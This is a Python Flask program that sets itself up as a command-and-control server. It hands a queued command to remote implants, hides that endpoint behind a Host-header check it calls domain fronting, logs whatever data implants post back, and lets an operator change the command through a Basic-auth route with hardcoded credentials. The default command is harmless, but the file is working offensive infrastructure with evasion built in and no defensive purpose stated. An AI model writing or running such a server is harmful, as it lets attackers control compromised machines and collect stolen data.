from flask import Flask, request, jsonify, abort
from functools import wraps
import logging

app = Flask(__name__)

logging.basicConfig(filename='c2_server.log', level=logging.INFO,
                    format='%(asctime)s:%(levelname)s:%(message)s')

commands = {
    "default": "popmsg Hello, World!"
}

def check_auth(username, password):
    return username == 'admin' and password == 'password'

def authenticate():
    message = {'message': "Authenticate."}
    resp = jsonify(message)
    resp.status_code = 401
    resp.headers['WWW-Authenticate'] = 'Basic realm="Example"'
    return resp

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

@app.route('/api/command', methods=['GET'])
def get_command():
    # Implement domain fronting by validating the Host header
    if request.headers.get('Host') != 'mylegitdomain.com':
        return "Forbidden", 403

    command = commands.get("default")
    return jsonify({'command': command})

@app.route('/api/webhook', methods=['POST'])
def webhook():
    data = request.json
    if not data:
        abort(400) 
        
    logging.info(f"Received data: {data}")
    
    print("Received data:", data)
    
    return "OK", 200

@app.route('/api/update_command', methods=['POST'])
@requires_auth
def update_command():
    data = request.json
    if not data or 'command' not in data:
        abort(400) 

    commands["default"] = data['command']
    
    logging.info(f"Command updated to: {data['command']}")
    
    return jsonify({'message': 'Command updated successfully'}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, ssl_context=('cert.pem', 'key.pem'))
